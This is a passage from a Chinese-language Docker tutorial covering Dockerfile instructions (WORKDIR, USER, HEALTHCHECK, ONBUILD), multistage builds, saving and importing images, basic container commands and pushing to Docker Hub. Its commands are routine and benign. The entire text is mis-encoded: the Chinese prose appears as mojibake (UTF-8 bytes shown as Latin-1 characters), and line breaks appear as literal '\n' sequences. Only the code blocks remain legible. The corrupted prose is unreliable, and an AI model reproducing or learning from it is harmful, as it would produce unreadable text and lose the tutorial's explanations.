ä»…ä»…æ˜¯å£°æ˜å®¹å™¨æ‰“ç®—ä½¿ç”¨ä»€ä¹ˆç«¯å£è€Œå·²ï¼Œå¹¶ä¸ä¼šè‡ªåŠ¨åœ¨å®¿ä¸»è¿›è¡Œç«¯å£æ˜ å°„ã€‚\n\n\n\n+ WORKDIR æŒ‡å®šå·¥ä½œç›®å½•\n\næ ¼å¼ä¸º `WORKDIR <å·¥ä½œç›®å½•è·¯å¾„>`ã€‚\n\nä½¿ç”¨Â `WORKDIR`Â æŒ‡ä»¤å¯ä»¥æ¥æŒ‡å®šå·¥ä½œç›®å½•ï¼ˆæˆ–è€…ç§°ä¸ºå½“å‰ç›®å½•ï¼‰ï¼Œä»¥åå„å±‚çš„å½“å‰ç›®å½•å°±è¢«æ”¹ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œå¦‚è¯¥ç›®å½•ä¸å­˜åœ¨ï¼Œ`WORKDIR`Â ä¼šå¸®ä½ å»ºç«‹ç›®å½•ã€‚\n\n\n\nä¹‹å‰æåˆ°ä¸€äº›åˆå­¦è€…å¸¸çŠ¯çš„é”™è¯¯æ˜¯æŠŠ `Dockerfile` ç­‰åŒäº Shell è„šæœ¬æ¥ä¹¦å†™ï¼Œè¿™ç§é”™è¯¯çš„ç†è§£è¿˜å¯èƒ½ä¼šå¯¼è‡´å‡ºç°ä¸‹é¢è¿™æ ·çš„é”™è¯¯ï¼š\n\n```\nRUN cd /app\nRUN echo \"hello\" > world.txt\n```\n\nå¦‚æœå°†è¿™ä¸ª `Dockerfile` è¿›è¡Œæ„å»ºé•œåƒè¿è¡Œåï¼Œä¼šå‘ç°æ‰¾ä¸åˆ° `/app/world.txt` æ–‡ä»¶ï¼Œæˆ–è€…å…¶å†…å®¹ä¸æ˜¯ `hello`ã€‚åŸå› å…¶å®å¾ˆç®€å•ï¼Œåœ¨ Shell ä¸­ï¼Œè¿ç»­ä¸¤è¡Œæ˜¯åŒä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œç¯å¢ƒï¼Œå› æ­¤å‰ä¸€ä¸ªå‘½ä»¤ä¿®æ”¹çš„å†…å­˜çŠ¶æ€ï¼Œä¼šç›´æ¥å½±å“åä¸€ä¸ªå‘½ä»¤ï¼›è€Œåœ¨ `Dockerfile` ä¸­ï¼Œ **è¿™ä¸¤è¡Œ `RUN` å‘½ä»¤çš„æ‰§è¡Œç¯å¢ƒæ ¹æœ¬ä¸åŒï¼Œæ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„å®¹å™¨ã€‚**è¿™å°±æ˜¯å¯¹ `Dockerfile` æ„å»ºåˆ†å±‚å­˜å‚¨çš„æ¦‚å¿µä¸äº†è§£æ‰€å¯¼è‡´çš„é”™è¯¯ã€‚\n\n\n\nä¹‹å‰è¯´è¿‡æ¯ä¸€ä¸ª `RUN` éƒ½æ˜¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨ã€æ‰§è¡Œå‘½ä»¤ã€ç„¶åæäº¤å­˜å‚¨å±‚æ–‡ä»¶å˜æ›´ã€‚ç¬¬ä¸€å±‚ `RUN cd /app` çš„æ‰§è¡Œä»…ä»…æ˜¯å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•å˜æ›´ï¼Œä¸€ä¸ªå†…å­˜ä¸Šçš„å˜åŒ–è€Œå·²ï¼Œå…¶ç»“æœä¸ä¼šé€ æˆä»»ä½•æ–‡ä»¶å˜æ›´ã€‚è€Œåˆ°ç¬¬äºŒå±‚çš„æ—¶å€™ï¼Œå¯åŠ¨çš„æ˜¯ä¸€ä¸ªå…¨æ–°çš„å®¹å™¨ï¼Œè·Ÿç¬¬ä¸€å±‚çš„å®¹å™¨æ›´å®Œå…¨æ²¡å…³ç³»ï¼Œè‡ªç„¶ä¸å¯èƒ½ç»§æ‰¿å‰ä¸€å±‚æ„å»ºè¿‡ç¨‹ä¸­çš„å†…å­˜å˜åŒ–ã€‚\n\nå› æ­¤å¦‚æœéœ€è¦æ”¹å˜ä»¥åå„å±‚çš„å·¥ä½œç›®å½•çš„ä½ç½®ï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨ `WORKDIR` æŒ‡ä»¤ã€‚\n\n \n\n+ USER æŒ‡å®šå½“å‰ç”¨æˆ·\n\næ ¼å¼ï¼š`USER <ç”¨æˆ·å>`\n\n`USER` æŒ‡ä»¤å’Œ `WORKDIR` ç›¸ä¼¼ï¼Œéƒ½æ˜¯æ”¹å˜ç¯å¢ƒçŠ¶æ€å¹¶å½±å“ä»¥åçš„å±‚ã€‚`WORKDIR` æ˜¯æ”¹å˜å·¥ä½œç›®å½•ï¼Œ`USER`åˆ™æ˜¯æ”¹å˜ä¹‹åå±‚çš„æ‰§è¡Œ `RUN`, `CMD` ä»¥åŠ `ENTRYPOINT` è¿™ç±»å‘½ä»¤çš„èº«ä»½ã€‚\n\n\n\nå½“ç„¶ï¼Œå’Œ `WORKDIR` ä¸€æ ·ï¼Œ`USER` åªæ˜¯å¸®åŠ©ä½ åˆ‡æ¢åˆ°æŒ‡å®šç”¨æˆ·è€Œå·²ï¼Œè¿™ä¸ªç”¨æˆ·å¿…é¡»æ˜¯äº‹å…ˆå»ºç«‹å¥½çš„ï¼Œå¦åˆ™æ— æ³•åˆ‡æ¢ã€‚\n\n```\nRUN groupadd -r redis && useradd -r -g redis redis\nUSER redis\nRUN [ \"redis-server\" ]\n```\n\n \n\nå¦‚æœä»¥ `root` æ‰§è¡Œçš„è„šæœ¬ï¼Œåœ¨æ‰§è¡ŒæœŸé—´å¸Œæœ›æ”¹å˜èº«ä»½ï¼Œæ¯”å¦‚å¸Œæœ›ä»¥æŸä¸ªå·²ç»å»ºç«‹å¥½çš„ç”¨æˆ·æ¥è¿è¡ŒæŸä¸ªæœåŠ¡è¿›ç¨‹ï¼Œä¸è¦ä½¿ç”¨ `su` æˆ–è€… `sudo`ï¼Œè¿™äº›éƒ½éœ€è¦æ¯”è¾ƒéº»çƒ¦çš„é…ç½®ï¼Œè€Œä¸”åœ¨ TTY ç¼ºå¤±çš„ç¯å¢ƒä¸‹ç»å¸¸å‡ºé”™ã€‚å»ºè®®ä½¿ç”¨ [`gosu`](https://github.com/tianon/gosu)ã€‚\n\n```\n# å»ºç«‹ redis ç”¨æˆ·ï¼Œå¹¶ä½¿ç”¨ gosu æ¢å¦ä¸€ä¸ªç”¨æˆ·æ‰§è¡Œå‘½ä»¤\nRUN groupadd -r redis && useradd -r -g redis redis\n# ä¸‹è½½ gosu\nRUN wget -O /usr/local/bin/gosu \"https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64\" \\\n    && chmod +x /usr/local/bin/gosu \\\n    && gosu nobody true\n# è®¾ç½® CMDï¼Œå¹¶ä»¥å¦å¤–çš„ç”¨æˆ·æ‰§è¡Œ\nCMD [ \"exec\", \"gosu\", \"redis\", \"redis-server\" ]\n```\n\n\n\n+ HEALTHCHECK å¥åº·æ£€æŸ¥\n\næ ¼å¼ï¼š\n\n- `HEALTHCHECK [é€‰é¡¹] CMD <å‘½ä»¤>`ï¼šè®¾ç½®æ£€æŸ¥å®¹å™¨å¥åº·çŠ¶å†µçš„å‘½ä»¤\n- `HEALTHCHECK NONE`ï¼šå¦‚æœåŸºç¡€é•œåƒæœ‰å¥åº·æ£€æŸ¥æŒ‡ä»¤ï¼Œä½¿ç”¨è¿™è¡Œå¯ä»¥å±è”½æ‰å…¶å¥åº·æ£€æŸ¥æŒ‡ä»¤\n\nè€Œè‡ª 1.12 ä¹‹åï¼ŒDocker æä¾›äº† `HEALTHCHECK` æŒ‡ä»¤ï¼Œé€šè¿‡è¯¥æŒ‡ä»¤æŒ‡å®šä¸€è¡Œå‘½ä»¤ï¼Œç”¨è¿™è¡Œå‘½ä»¤æ¥åˆ¤æ–­å®¹å™¨ä¸»è¿›ç¨‹çš„æœåŠ¡çŠ¶æ€æ˜¯å¦è¿˜æ­£å¸¸ï¼Œä»è€Œæ¯”è¾ƒçœŸå®çš„ååº”å®¹å™¨å®é™…çŠ¶æ€ã€‚\n\n å½“åœ¨ä¸€ä¸ªé•œåƒæŒ‡å®šäº† `HEALTHCHECK` æŒ‡ä»¤åï¼Œç”¨å…¶å¯åŠ¨å®¹å™¨ï¼Œåˆå§‹çŠ¶æ€ä¼šä¸º `starting`ï¼Œåœ¨ `HEALTHCHECK` æŒ‡ä»¤æ£€æŸ¥æˆåŠŸåå˜ä¸º `healthy`ï¼Œå¦‚æœè¿ç»­ä¸€å®šæ¬¡æ•°å¤±è´¥ï¼Œåˆ™ä¼šå˜ä¸º `unhealthy`ã€‚\n\n \n\n`HEALTHCHECK` æ”¯æŒä¸‹åˆ—é€‰é¡¹ï¼š\n\n- `--interval=<é—´éš”>`ï¼šä¸¤æ¬¡å¥åº·æ£€æŸ¥çš„é—´éš”ï¼Œé»˜è®¤ä¸º 30 ç§’ï¼›\n- `--timeout=<æ—¶é•¿>`ï¼šå¥åº·æ£€æŸ¥å‘½ä»¤è¿è¡Œè¶…æ—¶æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ—¶é—´ï¼Œæœ¬æ¬¡å¥åº·æ£€æŸ¥å°±è¢«è§†ä¸ºå¤±è´¥ï¼Œé»˜è®¤ 30 ç§’ï¼›\n- `--retries=<æ¬¡æ•°>`ï¼šå½“è¿ç»­å¤±è´¥æŒ‡å®šæ¬¡æ•°åï¼Œåˆ™å°†å®¹å™¨çŠ¶æ€è§†ä¸º `unhealthy`ï¼Œé»˜è®¤ 3 æ¬¡ã€‚\n\n**å’Œ `CMD`, `ENTRYPOINT` ä¸€æ ·ï¼Œ`HEALTHCHECK` åªå¯ä»¥å‡ºç°ä¸€æ¬¡ï¼Œå¦‚æœå†™äº†å¤šä¸ªï¼Œåªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚**\n\n \n\nå‡è®¾æˆ‘ä»¬æœ‰ä¸ªé•œåƒæ˜¯ä¸ªæœ€ç®€å•çš„ Web æœåŠ¡ï¼Œæˆ‘ä»¬å¸Œæœ›å¢åŠ å¥åº·æ£€æŸ¥æ¥åˆ¤æ–­å…¶ Web æœåŠ¡æ˜¯å¦åœ¨æ­£å¸¸å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ `curl` æ¥å¸®åŠ©åˆ¤æ–­ï¼Œå…¶ `Dockerfile` çš„ `HEALTHCHECK` å¯ä»¥è¿™ä¹ˆå†™ï¼š\n\n```\nFROM nginx\nRUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*\nHEALTHCHECK --interval=5s --timeout=3s \\\n  CMD curl -fs http://localhost/ || exit 1\n```\n\n \n\n+ ONBUILD ä¸ºä»–äººåšå«è¡£è£³\n\næ ¼å¼ï¼š`ONBUILD <å…¶å®ƒæŒ‡ä»¤>`ã€‚\n\n`ONBUILD` æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡ä»¤ï¼Œå®ƒåé¢è·Ÿçš„æ˜¯å…¶å®ƒæŒ‡ä»¤ï¼Œæ¯”å¦‚ `RUN`, `COPY` ç­‰ï¼Œè€Œè¿™äº›æŒ‡ä»¤ï¼Œåœ¨å½“å‰é•œåƒæ„å»ºæ—¶å¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚åªæœ‰å½“ä»¥å½“å‰é•œåƒä¸ºåŸºç¡€é•œåƒï¼Œå»æ„å»ºä¸‹ä¸€çº§é•œåƒçš„æ—¶å€™æ‰ä¼šè¢«æ‰§è¡Œã€‚\n\n`Dockerfile` ä¸­çš„å…¶å®ƒæŒ‡ä»¤éƒ½æ˜¯ä¸ºäº†å®šåˆ¶å½“å‰é•œåƒè€Œå‡†å¤‡çš„ï¼Œå”¯æœ‰ `ONBUILD` æ˜¯ä¸ºäº†å¸®åŠ©åˆ«äººå®šåˆ¶è‡ªå·±è€Œå‡†å¤‡çš„ã€‚\n\n \n\n2.4 dockerå¤šé˜¶æ®µæ„å»º (å¤šä¸ª FROM as)\n\næˆ‘ä»¬æ„å»º Docker é•œåƒæ—¶ï¼Œä¸€ç§æ–¹å¼æ˜¯å°†æ‰€æœ‰çš„æ„å»ºè¿‡ç¨‹ç¼–åŒ…å«åœ¨ä¸€ä¸ª `Dockerfile` ä¸­ï¼ŒåŒ…æ‹¬é¡¹ç›®åŠå…¶ä¾èµ–åº“çš„ç¼–è¯‘ã€æµ‹è¯•ã€æ‰“åŒ…ç­‰æµç¨‹ï¼Œè¿™é‡Œå¯èƒ½ä¼šå¸¦æ¥çš„ä¸€äº›é—®é¢˜ï¼š\n\n- `Dockerfile` ç‰¹åˆ«é•¿ï¼Œå¯ç»´æŠ¤æ€§é™ä½\n\n- é•œåƒå±‚æ¬¡å¤šï¼Œé•œåƒä½“ç§¯è¾ƒå¤§ï¼Œéƒ¨ç½²æ—¶é—´å˜é•¿\n\n- æºä»£ç å­˜åœ¨æ³„éœ²çš„é£é™©\n\n  \n\nDocker v17.05 å¼€å§‹æ”¯æŒå¤šé˜¶æ®µæ„å»º (`multistage builds`)ã€‚\n\nç¼–å†™ `Dockerfile` æ–‡ä»¶\n\n```\nFROM golang:1.9-alpine as builder\n\nRUN apk --no-cache add git\n\nWORKDIR /go/src/github.com/go/helloworld/\n\nRUN go get -d -v github.com/go-sql-driver/mysql\n\nCOPY app.go .\n\nRUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .\n\nFROM alpine:latest as prod\n\nRUN apk --no-cache add ca-certificates\n\nWORKDIR /root/\n\nCOPY --from=0 /go/src/github.com/go/helloworld/app .\n\nCMD [\"./app\"]\n```\n\næ„å»ºé•œåƒ\n\n```\n$ docker build -t go/helloworld:3 .\n```\n\n\n\n+ åªæ„å»ºæŸä¸€é˜¶æ®µçš„é•œåƒ\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `as` æ¥ä¸ºæŸä¸€é˜¶æ®µå‘½åï¼Œä¾‹å¦‚\n\n```\nFROM golang:1.9-alpine as builder\n```\n\nä¾‹å¦‚å½“æˆ‘ä»¬åªæƒ³æ„å»º `builder` é˜¶æ®µçš„é•œåƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨ `docker build` å‘½ä»¤æ—¶åŠ ä¸Š `--target`å‚æ•°å³å¯\n\n```\n$ docker build --target builder -t username/imagename:tag .\n```\n\n\n\n+ æ„å»ºæ—¶ä»å…¶ä»–é•œåƒå¤åˆ¶æ–‡ä»¶\n\nä¸Šé¢ä¾‹å­ä¸­æˆ‘ä»¬ä½¿ç”¨ `COPY --from=0 /go/src/github.com/go/helloworld/app .` ä»ä¸Šä¸€é˜¶æ®µçš„é•œåƒä¸­å¤åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¤åˆ¶ä»»æ„é•œåƒä¸­çš„æ–‡ä»¶ã€‚\n\n```\n$ COPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf\n```\n\n\n\n2.5 å…¶å®ƒåˆ¶ä½œé•œåƒçš„æ–¹å¼\n\n\n\n+  `docker save` å’Œ `docker load`\n\nDocker è¿˜æä¾›äº†Â `docker load`Â å’ŒÂ `docker save`Â å‘½ä»¤ï¼Œç”¨ä»¥å°†é•œåƒä¿å­˜ä¸ºä¸€ä¸ªÂ `tar`Â æ–‡ä»¶ï¼Œç„¶åä¼ è¾“åˆ°å¦ä¸€ä¸ªä½ç½®ä¸Šï¼Œå†åŠ è½½è¿›æ¥ã€‚è¿™æ˜¯åœ¨æ²¡æœ‰ Docker Registry æ—¶çš„åšæ³•ï¼Œç°åœ¨å·²ç»ä¸æ¨èï¼Œé•œåƒè¿ç§»åº”è¯¥ç›´æ¥ä½¿ç”¨ Docker Registryï¼Œæ— è®ºæ˜¯ç›´æ¥ä½¿ç”¨ Docker Hub è¿˜æ˜¯ä½¿ç”¨å†…ç½‘ç§æœ‰ Registry éƒ½å¯ä»¥ã€‚\n\n\n\n+ ä¿å­˜é•œåƒ\n\nä½¿ç”¨ `docker save` å‘½ä»¤å¯ä»¥å°†é•œåƒä¿å­˜ä¸ºå½’æ¡£æ–‡ä»¶ã€‚\n\næ¯”å¦‚æˆ‘ä»¬å¸Œæœ›ä¿å­˜è¿™ä¸ª `alpine` é•œåƒã€‚\n\n```\n$ docker image ls alpine\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\nalpine              latest              baa5d63471ea        5 weeks ago         4.803 MB\n```\n\nä¿å­˜é•œåƒçš„å‘½ä»¤ä¸ºï¼š\n\n```\n$ docker save alpine | gzip > alpine-latest.tar.gz\n```\n\nç„¶åæˆ‘ä»¬å°† `alpine-latest.tar.gz` æ–‡ä»¶å¤åˆ¶åˆ°äº†åˆ°äº†å¦ä¸€ä¸ªæœºå™¨ä¸Šï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤åŠ è½½é•œåƒï¼š\n\n```\n$ docker load -i alpine-latest.tar.gz\nLoaded image: alpine:latest\n```\n\n \n\nå¦‚æœæˆ‘ä»¬ç»“åˆè¿™ä¸¤ä¸ªå‘½ä»¤ä»¥åŠ `ssh` ç”šè‡³ `pv` çš„è¯ï¼Œåˆ©ç”¨ Linux å¼ºå¤§çš„ç®¡é“ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªå‘½ä»¤å®Œæˆä»ä¸€ä¸ªæœºå™¨å°†é•œåƒè¿ç§»åˆ°å¦ä¸€ä¸ªæœºå™¨ï¼Œå¹¶ä¸”å¸¦è¿›åº¦æ¡çš„åŠŸèƒ½ï¼š\n\n```\ndocker save <é•œåƒå> | bzip2 | pv | ssh <ç”¨æˆ·å>@<ä¸»æœºå> 'cat | docker load'\n```\n\n\n\n+ docker export save åŒºåˆ«\n\n- docker saveæ˜¯å°†ä¸€ä¸ªé•œåƒå¯¼å‡ºæˆä¸€ä¸ªtarballæ–‡ä»¶ï¼Œå¯¹åº”çš„å¯¼å…¥å‘½ä»¤æ˜¯docker loadï¼Œå°†è¯¥æ–‡ä»¶å¯¼å…¥æˆä¸€ä¸ªé•œåƒã€‚ \n- docker exportæ˜¯å°†ä¸€ä¸ªå®¹å™¨å¯¼å‡ºæˆä¸€ä¸ªtarballæ–‡ä»¶ï¼Œå¯¹åº”çš„å¯¼å…¥å‘½ä»¤æ—¶docker importï¼Œå°†è¯¥æ–‡ä»¶å¯¼å…¥æˆä¸€ä¸ªé•œåƒï¼ˆæ³¨æ„ä¸æ˜¯å®¹å™¨ï¼‰ã€‚  å®¹å™¨å¿«ç…§å°†ä¼šä¸¢å¼ƒæ‰€æœ‰çš„å†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯\n\n\n\n# 3. æ“ä½œå®¹å™¨\n\n3.1 æ–°å»ºå¹¶å¯åŠ¨ \n\næ‰€éœ€è¦çš„å‘½ä»¤ä¸»è¦ä¸ºÂ `docker run`ã€‚\n\n```\n$ docker run -t -i ubuntu:14.04 /bin/bash\nroot@af8bae53bdd3:/#\n```\n\nå…¶ä¸­ï¼Œ`-t`Â é€‰é¡¹è®©Dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼ˆpseudo-ttyï¼‰å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Šï¼ŒÂ `-i`Â åˆ™è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚\n\n\n\nå½“åˆ©ç”¨ `docker run` æ¥åˆ›å»ºå®¹å™¨æ—¶ï¼ŒDocker åœ¨åå°è¿è¡Œçš„æ ‡å‡†æ“ä½œåŒ…æ‹¬ï¼š\n\n- æ£€æŸ¥æœ¬åœ°æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é•œåƒï¼Œä¸å­˜åœ¨å°±ä»å…¬æœ‰ä»“åº“ä¸‹è½½\n- åˆ©ç”¨é•œåƒåˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨\n- åˆ†é…ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨åªè¯»çš„é•œåƒå±‚å¤–é¢æŒ‚è½½ä¸€å±‚å¯è¯»å†™å±‚\n- ä»å®¿ä¸»ä¸»æœºé…ç½®çš„ç½‘æ¡¥æ¥å£ä¸­æ¡¥æ¥ä¸€ä¸ªè™šæ‹Ÿæ¥å£åˆ°å®¹å™¨ä¸­å»\n- ä»åœ°å€æ± é…ç½®ä¸€ä¸ª ip åœ°å€ç»™å®¹å™¨\n- æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„åº”ç”¨ç¨‹åº\n- æ‰§è¡Œå®Œæ¯•åå®¹å™¨è¢«ç»ˆæ­¢\n\n\n\n3.2 å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨\n\nå¯ä»¥åˆ©ç”¨Â `docker container start`Â å‘½ä»¤ï¼Œç›´æ¥å°†ä¸€ä¸ªå·²ç»ç»ˆæ­¢çš„å®¹å™¨å¯åŠ¨è¿è¡Œã€‚\n\n\n\n3.3 åå°è¿è¡Œ\n\næ›´å¤šçš„æ—¶å€™ï¼Œéœ€è¦è®© Docker åœ¨åå°è¿è¡Œè€Œä¸æ˜¯ç›´æ¥æŠŠæ‰§è¡Œå‘½ä»¤çš„ç»“æœè¾“å‡ºåœ¨å½“å‰å®¿ä¸»æœºä¸‹ã€‚æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ Â `-d`Â å‚æ•°æ¥å®ç°ã€‚\n\n```\n docker run -d ubuntu:17.10 /bin/sh -c \"while true; do echo hello world; sleep 1; done\"\n77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a\n```\n\næ­¤æ—¶å®¹å™¨ä¼šåœ¨åå°è¿è¡Œå¹¶ä¸ä¼šæŠŠè¾“å‡ºçš„ç»“æœ (STDOUT) æ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢(è¾“å‡ºç»“æœå¯ä»¥ç”¨Â `docker logs`æŸ¥çœ‹)ã€‚\n\n\n\nè¦è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡Â `docker container logs`Â å‘½ä»¤ã€‚\n\n```\ndocker container logs [container ID or NAMES]\nhello world\nhello world\nhello world\n. . .\n```\n\n\n\n3.4 ç»ˆæ­¢å®¹å™¨\n\nå¯ä»¥ä½¿ç”¨ `docker container stop` æ¥ç»ˆæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ã€‚\n\n \n\n3.5 è¿›å…¥å®¹å™¨\n\n`docker exec` åè¾¹å¯ä»¥è·Ÿå¤šä¸ªå‚æ•°ï¼Œè¿™é‡Œä¸»è¦è¯´æ˜ `-i` `-t` å‚æ•°ã€‚\n\nåªç”¨ `-i` å‚æ•°æ—¶ï¼Œç”±äºæ²¡æœ‰åˆ†é…ä¼ªç»ˆç«¯ï¼Œç•Œé¢æ²¡æœ‰æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ï¼Œä½†å‘½ä»¤æ‰§è¡Œç»“æœä»ç„¶å¯ä»¥è¿”å›ã€‚\n\nå½“ `-i` `-t` å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œåˆ™å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ã€‚\n\n\n\n```\ndocker exec -it 69d1 bash\nroot@69d137adef7a:/#\n```\n\n\n\n3.6 å¯¼å‡ºå®¹å™¨\n\nå¦‚æœè¦å¯¼å‡ºæœ¬åœ°æŸä¸ªå®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨Â `docker export`Â å‘½ä»¤ã€‚\n\n```\ndocker export 7691a814370e > ubuntu.tar\n```\n\nè¿™æ ·å°†å¯¼å‡ºå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°æ–‡ä»¶ã€‚\n\n\n\n3.7 å¯¼å…¥å®¹å™¨å¿«ç…§\n\n```\n$ cat ubuntu.tar | docker import - test/ubuntu:v1.0\n$ docker image ls\nREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE\ntest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB\n```\n\n\n\næ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®š URL æˆ–è€…æŸä¸ªç›®å½•æ¥å¯¼å…¥ï¼Œä¾‹å¦‚\n\n```\n$ docker import http://example.com/exampleimage.tgz example/imagerepo\n```\n\n\n\næ³¨ï¼šç”¨æˆ·æ—¢å¯ä»¥ä½¿ç”¨Â docker loadÂ æ¥å¯¼å…¥é•œåƒå­˜å‚¨æ–‡ä»¶åˆ°æœ¬åœ°é•œåƒåº“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Â docker importÂ æ¥å¯¼å…¥ä¸€ä¸ªå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°é•œåƒåº“ã€‚è¿™ä¸¤è€…çš„åŒºåˆ«åœ¨äºå®¹å™¨å¿«ç…§æ–‡ä»¶å°†ä¸¢å¼ƒæ‰€æœ‰çš„å†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯ï¼ˆå³ä»…ä¿å­˜å®¹å™¨å½“æ—¶çš„å¿«ç…§çŠ¶æ€ï¼‰ï¼Œè€Œé•œåƒå­˜å‚¨æ–‡ä»¶å°†ä¿å­˜å®Œæ•´è®°å½•ï¼Œä½“ç§¯ä¹Ÿè¦å¤§ã€‚æ­¤å¤–ï¼Œä»å®¹å™¨å¿«ç…§æ–‡ä»¶å¯¼å…¥æ—¶å¯ä»¥é‡æ–°æŒ‡å®šæ ‡ç­¾ç­‰å…ƒæ•°æ®ä¿¡æ¯ã€‚ \n\n\n\n3.8 åˆ é™¤å®¹å™¨\n\nå¯ä»¥ä½¿ç”¨Â `docker container rm`Â æ¥åˆ é™¤ä¸€ä¸ªå¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¾‹å¦‚\n\n```\n$ docker container rm  trusting_newton\ntrusting_newton\n```\n\n\n\n3.9 æ¸…ç†æ‰€æœ‰å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨\n\n```\n$ docker container prune\n```\n\n\n\n# 4. è®¿é—®ä»“åº“\n\n4.1 Docker Hub\n\nä½ å¯ä»¥åœ¨Â [https://cloud.docker.com](https://cloud.docker.com/)Â å…è´¹æ³¨å†Œä¸€ä¸ª Docker è´¦å·ã€‚\n\nå¯ä»¥é€šè¿‡æ‰§è¡Œ `docker login` å‘½ä»¤äº¤äº’å¼çš„è¾“å…¥ç”¨æˆ·ååŠå¯†ç æ¥å®Œæˆåœ¨å‘½ä»¤è¡Œç•Œé¢ç™»å½• Docker Hubã€‚\n\nä½ å¯ä»¥é€šè¿‡ `docker logout` é€€å‡ºç™»å½•ã€‚\n\n\n\n4.2 æ‹‰å–é•œåƒ\n\nä½ å¯ä»¥é€šè¿‡Â `docker search`Â å‘½ä»¤æ¥æŸ¥æ‰¾å®˜æ–¹ä»“åº“ä¸­çš„é•œåƒï¼Œå¹¶åˆ©ç”¨Â `docker pull`Â å‘½ä»¤æ¥å°†å®ƒä¸‹è½½åˆ°æœ¬åœ°ã€‚\n\n\n\nä¸€ç§æ˜¯ç±»ä¼¼Â `centos`Â è¿™æ ·çš„é•œåƒï¼Œè¢«ç§°ä¸ºåŸºç¡€é•œåƒæˆ–æ ¹é•œåƒã€‚è¿™äº›åŸºç¡€é•œåƒç”± Docker å…¬å¸åˆ›å»ºã€éªŒè¯ã€æ”¯æŒã€æä¾›ã€‚è¿™æ ·çš„é•œåƒå¾€å¾€ä½¿ç”¨å•ä¸ªå•è¯ä½œä¸ºåå­—ã€‚\n\nè¿˜æœ‰ä¸€ç§ç±»å‹ï¼Œæ¯”å¦‚Â `tianon/centos`Â é•œåƒï¼Œå®ƒæ˜¯ç”± Docker çš„ç”¨æˆ·åˆ›å»ºå¹¶ç»´æŠ¤çš„ï¼Œå¾€å¾€å¸¦æœ‰ç”¨æˆ·åç§°å‰ç¼€ã€‚å¯ä»¥é€šè¿‡å‰ç¼€Â `username/`Â æ¥æŒ‡å®šä½¿ç”¨æŸä¸ªç”¨æˆ·æä¾›çš„é•œåƒï¼Œæ¯”å¦‚ tianon ç”¨æˆ·ã€‚\n\n\n\n4.3 æ¨é€é•œåƒ\n\nç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨ç™»å½•åé€šè¿‡ `docker push` å‘½ä»¤æ¥å°†è‡ªå·±çš„é•œåƒæ¨é€åˆ° Docker Hubã€‚\n\n```\n$ docker tag ubuntu:17.10 username/ubuntu:17.10\n\n$ docker image ls\n\nREPOSITORY                                               TAG                    IMAGE ID            CREATED             SIZE\nubuntu                                                   17.10                  275d79972a86        6 days ago          94.6MB\nusername/ubuntu                                          17.10                  275d79972a86        6 days ago          94.6MB\n\n$ docker push username/ubuntu:17.10\n\n$ docker search username\n\nNAME                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED\nusername/ubuntu\n```\n\n\n\n4.4 